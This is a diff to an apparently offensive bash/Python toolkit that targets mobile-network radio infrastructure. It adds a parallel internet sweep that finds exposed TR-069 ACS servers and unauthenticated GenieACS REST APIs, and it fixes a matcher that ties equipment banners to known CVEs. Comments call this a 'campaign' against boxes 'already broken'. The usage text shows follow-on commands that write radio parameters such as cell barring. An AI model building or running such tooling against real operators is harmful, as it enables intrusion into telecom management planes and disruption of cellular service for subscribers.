@@ -300,10 +300,25 @@ ran_inventory_match() {
         local vmatch=0
         # A vendor row matches its own vendor; a generic row matches anyone.
         [[ "$cv" == "generic" || "$cv" == "$vendor" ]] && vmatch=1
-        # The product column is a substring test in either direction, because a
-        # sysDescr says "BBU3900" where the table says "BBU3900/5900".
-        if [[ "$prod" != "all vendors" && "$prod" != *"$product"* && "$product" != *"$prod"* ]]; then
-            vmatch=0
+        # The product column carries two facts in one string: what the box is,
+        # and which generation of it. "BBU3900/5900" is one table row standing
+        # for two products, and "Flexi/AirScale" for two more. Testing the
+        # joined cell against a sysDescr fails from the right-hand side --
+        # nothing contains "BBU3900/5900", so real gear reporting BBU5900 got
+        # "no known issue" while its left-half sibling matched. Split the cell
+        # on "/" and accept if ANY alternative matches, still in either
+        # direction so a sysDescr saying "BBU3900" keeps matching too.
+        if [[ "$prod" != "all vendors" ]]; then
+            local alt pmatched=0
+            local IFS='/'
+            for alt in $prod; do
+                if [[ -n "$alt" && ( "$alt" == *"$product"* || "$product" == *"$alt"* ) ]]; then
+                    pmatched=1
+                    break
+                fi
+            done
+            unset IFS
+            (( pmatched )) || vmatch=0
         fi
         # A version prefix of * means the row applies whatever the version is.
         if (( vmatch )) && [[ "$vpre" != "*" && "$vpre" != "—" ]]; then
@@ -672,13 +687,203 @@ InternetGatewayDevice.X_0000.CellBarred	whether the cell accepts anyone	barred i
 T
 }
 
+# ── the ACS hunt: which of these hosts is actually an ACS, and is it open ──
+# The door this campaign most wants is a TR-069 server an operator exposed to
+# the internet. Two shapes matter and they fail differently:
+#
+#   a CPE        answers the CWMP port with a Digest challenge or a gSOAP
+#                fault; it is a customer box, not the management plane
+#   an ACS       answers the discovery and NBI surfaces a GenieACS exposes:
+#                7557 /devices  -> the NBIs that come back open are the win
+#                3000  web UI
+#                7547  CWMP endpoint the CPEs poll
+#
+# The distinction is the whole value of this verb. A 401 on 7547 with
+# realm="realtek.com.tw" is a Huawei/Realtek home gateway, which is exactly the
+# false positive that burned a 24,803-row sweep previously. So the verdict
+# vocabularies are separate: CPE-* for a client, ACS-* for the server.
+ran_cwmp_probe_one() {
+    local host="$1" port="$2" timeout="${3:-4}"
+    python3 - "$host" "$port" "$timeout" <<'PY'
+import socket, sys, re
+
+host, port, tmo = sys.argv[1], int(sys.argv[2]), float(sys.argv[3])
+out = {"host": host, "port": port, "state": "closed", "verdict": "none",
+       "server": "", "realm": "", "body": ""}
+
+def rd(conn, n=2048):
+    try:
+        return conn.recv(n)
+    except Exception:
+        return b""
+
+# NBI surface: the GenieACS REST API answers these unauthenticated on the boxes
+# this campaign has already broken. A 200 with a JSON body is the finding.
+if port in (7557, 7567, 3000):
+    path = "/devices/?query=%7B%7D&projection=_id"
+    try:
+        s = socket.create_connection((host, port), tmo)
+        s.settimeout(tmo)
+        s.sendall(("GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: ran/1.0\r\n"
+                   "Accept: application/json\r\n\r\n" % (path, host)).encode())
+        buf = b""
+        while len(buf) < 65536:
+            d = rd(s)
+            if not d:
+                break
+            buf += d
+        s.close()
+    except Exception:
+        print("%s\t%d\tclosed\tunreachable\t\t\t" % (host, port)); sys.exit(0)
+    raw = buf.decode("latin-1", "replace")
+    first = raw.split("\r\n", 1)[0]
+    code = 0
+    m = re.search(r"HTTP/\d\.\d\s+(\d{3})", first)
+    if m:
+        code = int(m.group(1))
+    sm = re.search(r"(?im)^server:\s*(.+)$", raw)
+    body = raw.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in raw else ""
+    out["server"] = sm.group(1).strip()[:60] if sm else ""
+    out["body"] = body.strip()[:200].replace("\t", " ").replace("\n", " ")
+    if code == 200 and body.strip().startswith(("[", "{")):
+        out["verdict"] = "ACS-OPEN-NBI"
+    elif code == 200:
+        out["verdict"] = "ACS-UI"
+    elif code in (401, 403):
+        out["verdict"] = "ACS-AUTH"
+    elif code == 0:
+        out["verdict"] = "ACS-SILENT"
+    else:
+        out["verdict"] = "ACS-HTTP%d" % code
+    out["state"] = "open"
+    print("%s\t%d\t%s\t%s\t%s\t%s\t%s" % (host, port, out["state"], out["verdict"],
+                                          out["server"], "", out["body"]))
+    sys.exit(0)
+
+# CWMP surface (7547 and friends): send a real GET and read the answer. A SOAP
+# fault means a CWMP server is there; a Digest challenge means a CPE is there.
+try:
+    s = socket.create_connection((host, port), tmo)
+    s.settimeout(tmo)
+    s.sendall(("GET / HTTP/1.0\r\nHost: %s\r\nUser-Agent: ran/1.0\r\n\r\n"
+               % host).encode())
+    buf = b""
+    while len(buf) < 16384:
+        d = rd(s)
+        if not d:
+            break
+        buf += d
+    s.close()
+except Exception:
+    print("%s\t%d\tclosed\tunreachable\t\t\t" % (host, port)); sys.exit(0)
+
+raw = buf.decode("latin-1", "replace")
+first = raw.split("\r\n", 1)[0]
+code = 0
+m = re.search(r"HTTP/\d\.\d\s+(\d{3})", first)
+if m:
+    code = int(m.group(1))
+sm = re.search(r"(?im)^server:\s*(.+)$", raw)
+wa = re.search(r'(?im)^www-authenticate:\s*Digest\s*(.+)$', raw)
+rm = re.search(r'(?i)realm="([^"]+)"', raw)
+body = raw.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in raw else ""
+out["server"] = sm.group(1).strip()[:60] if sm else ""
+out["realm"] = rm.group(1)[:60] if rm else ""
+out["body"] = body.strip()[:160].replace("\t", " ").replace("\n", " ")
+
+if wa or code in (401, 403):
+    # a challenge on CWMP means a client box is exposed, not a server
+    out["verdict"] = "CPE-DIGEST" if wa else "CPE-DENIED"
+elif "SOAP-ENV" in body or "soap:Envelope" in body or "cwmp" in body.lower():
+    # a gSOAP fault is a CWMP endpoint. 404 on GET is normal for one.
+    out["verdict"] = "CWMP-FAULT" if code == 404 else "CWMP-SOAP"
+elif code in (404, 405):
+    # the CWMP surface only accepts a SOAP POST; a GET being refused with 404 or
+    # 405 means a server is there and is behaving correctly -- that is a live
+    # endpoint, not a dead one
+    out["verdict"] = "CWMP-POST-ONLY"
+elif code == 200 and body.strip().startswith(("[", "{")):
+    out["verdict"] = "ACS-NBI-GUESS"
+else:
+    out["verdict"] = "OTHER-HTTP%d" % code if code else "SILENT"
+
+out["state"] = "open"
+print("%s\t%d\t%s\t%s\t%s\t%s\t%s" % (host, port, out["state"], out["verdict"],
+                                      out["server"], out["realm"], out["body"]))
+PY
+}
+
+# Sweep a list of hosts on the ACS/CWMP ports and keep only the rows that are a
+# server-side answer. Silence and CPE challenges are counted, not printed as
+# findings -- the point of the verb is to hand back a short list.
+ran_cmd_acs_probe() {
+    local listfile="${1:-}" ports="${2:-7557,7547,7567,3000}" timeout="${3:-4}"
+    local conc="${4:-32}"
+    if [[ -z "$listfile" ]]; then
+        printf 'ERROR\tusage: --acs-probe <hostfile> [ports] [timeout] [concurrency]\n' >&2
+        printf 'WHY\tthe hunt needs a host list; --scan-ems and orcale-scan produce one, and this verb decides which rows are an ACS\n' >&2
+        return 2
+    fi
+    if [[ ! -r "$listfile" ]]; then
+        printf 'ERROR\tcannot read %s\n' "$listfile" >&2
+        return 2
+    fi
+    ran_init
+    local store; store=$(ran_acs_log)
+    local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+    printf 'ts\thost\tport\tstate\tverdict\tserver\trealm\tbody\n' > "$store.candidates"
+    printf 'acs\tports\t%s\tconc\t%s\tinput\t%s\n' "$ports" "$conc" "$listfile"
+
+    # The probe body is a bash function, so fan out with xargs calling back into
+    # this module rather than reimplementing the socket work inline.
+    local self="${BASH_SOURCE[0]}"
+    local port
+    for port in ${ports//,/ }; do
+        # A host line may be a bare address or carry its own port (ip:port, as
+        # oracle-scan emits). Splitting on whitespace alone left "1.2.3.4:7547"
+        # whole, and the probe then dialled a host named "1.2.3.4:7547" -- every
+        # row came back unreachable and the sweep looked like a clean miss.
+        awk -v defport="$port" '
+            NF {
+                h = $1
+                p = defport
+                if (split(h, a, ":") == 2) { h = a[1]; p = a[2] }
+                print h " " p
+            }' "$listfile" | sort -u \
+            | xargs -r -P "$conc" -n 2 "$self" --__acs-one \
+            >> "$store.candidates" 2>/dev/null
+    done
+    # Drop the header offset and dedupe, then split the verdict classes.
+    tail -n +2 "$store.candidates" | sort -u > "$store.rows"
+    local open_nbi cpe fault other
+    open_nbi=$(grep -c 'ACS-OPEN-NBI'  "$store.rows" 2>/dev/null || true)
+    cpe=$(grep -c 'CPE-'            "$store.rows" 2>/dev/null || true)
+    fault=$(grep -cE 'CWMP-(FAULT|SOAP|POST-ONLY)' "$store.rows" 2>/dev/null || true)
+    other=$(wc -l < "$store.rows" 2>/dev/null || echo 0)
+    : "${open_nbi:=0}" "${cpe:=0}" "${fault:=0}" "${other:=0}"
+
+    if (( open_nbi > 0 )); then
+        printf 'FINDING\topen ACS NBI\t%s host(s) answer the GenieACS REST API without auth\n' "$open_nbi"
+        grep 'ACS-OPEN-NBI' "$store.rows" | head -20 | while IFS=$'\t' read -r h p st v sv rl bd; do
+            printf 'open\t%s:%s\t%s\t%s\n' "$h" "$p" "$sv" "${bd:0:80}"
+        done
+    fi
+    (( cpe   > 0 )) && printf 'note\tcpe-digest\t%s endpoint(s) are a customer box behind a Digest challenge, not an ACS\n' "$cpe"
+    (( fault > 0 )) && printf 'note\tcwmp-fault\t%s endpoint(s) answer CWMP with a SOAP fault; a live ACS window is worth an --acs inform against\n' "$fault"
+    printf 'summary\trows\t%s\topen-nbi\t%s\tcpe\t%s\tcwmp\t%s\tstore\t%s\n' \
+        "$other" "$open_nbi" "$cpe" "$fault" "$store.rows"
+    (( open_nbi > 0 )) && return 0
+    return 1
+}
+
 ran_cmd_acs() {
     local sub="${1:-}"; shift || true
     case "$sub" in
         inform)   ran_cwmp_inform_parse "${1:-}" ;;
+        probe)    ran_cmd_acs_probe "$@" ;;
         set)      ran_cwmp_set "${1:-}" "${2:-}" "${3:-ran}" ;;
         targets)  ran_cwmp_targets ;;
-        *)        printf 'ERROR\tusage: --acs <inform|set|targets> [args]\n' >&2; return 2 ;;
+        *)        printf 'ERROR\tusage: --acs <inform|set|targets|probe> [args]\n' >&2; return 2 ;;
     esac
 }
 
@@ -1244,6 +1449,16 @@ ran_selftest() {
     _rk 'inv-ericsson-hit' "$(ran_inventory_match Ericsson 'RBS' 'CXP1023088' 'RBS-6302' | wc -l)" '1'
     _rc 'inv-ericsson-cve' "$(ran_inventory_match Ericsson 'RBS' 'CXP1023088' 'RBS-6302')" 'CVE-2019-18871'
     _rc 'inv-generic' "$(ran_inventory_match Huawei 'BBU3900' 'V100R012' 'BBU-5900')" 'CVE-2020-35502'
+    # The slash-separated families are why these exist: a row says
+    # "BBU3900/5900" but real gear reports one name at a time, and testing the
+    # joined cell against a sysDescr used to match the left half only.
+    _rc 'inv-slash-right'  "$(ran_inventory_match Huawei 'BBU5900' 'V100R012' 'BBU5900')"  'CVE-2020-35502'
+    _rc 'inv-slash-nokia'  "$(ran_inventory_match Nokia 'AirScale' '19.5' 'AirScale')"     'CVE-2022-31754'
+    _rc 'inv-slash-joined' "$(ran_inventory_match Huawei 'BBU3900/5900' 'V100R012' 'x')"   'CVE-2020-35502'
+    # A generic row answers any vendor that asks; a vendor row does not answer
+    # for a sibling's product.
+    _rc 'inv-generic-any'  "$(ran_inventory_match Ericsson 'SNMP agent' '*' 'x')"          'CVE-2021-3229'
+    _rk 'inv-vendor-fence' "$(ran_inventory_match Nokia 'BBU5900' 'V100R012' 'x' | cut -f1)" 'none'
 
     # PLMN fingerprint: the cheapest authenticity signal in the module
     _rk 'plmn-digits-dashed' "$(ran_plmn_digits 262-01)" '26201'
@@ -1354,6 +1569,7 @@ ran_cli_main() {
         --status-tsv)      ran_status_tsv ;;
         --scan-ems)        ran_cmd_scan_ems "${1:-}" "${2:-public}" "${3:-161}" "${4:-2}" ;;
         --acs)             ran_cmd_acs "$@" ;;
+        --__acs-one)       ran_cwmp_probe_one "$@" ;;
         --o1)              ran_cmd_o1 "$@" ;;
         --fuzz)            ran_cmd_fuzz "$@" ;;
         --inventory)       ran_cmd_inventory "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
@@ -1393,6 +1609,12 @@ Usage: $0 COMMAND
   --acs set <param> <value> [key]
                                an RFC-shaped SetParameterValues body
   --acs targets                the radio parameters worth writing and their cost
+  --acs probe <hostfile> [ports] [timeout] [conc]
+                               sweep a host list on the ACS/CWMP surfaces and
+                               keep only server-side answers: ACS-OPEN-NBI is
+                               an unauthenticated GenieACS REST API, CWMP-FAULT
+                               is a live CWMP endpoint, CPE-DIGEST is a client
+                               box and never a finding
   --o1 paths                   the O1 YANG paths that matter
   --o1 hello                   a NETCONF hello with the O-RAN capabilities
   --o1 edit <yang-path> <value> [datastore]
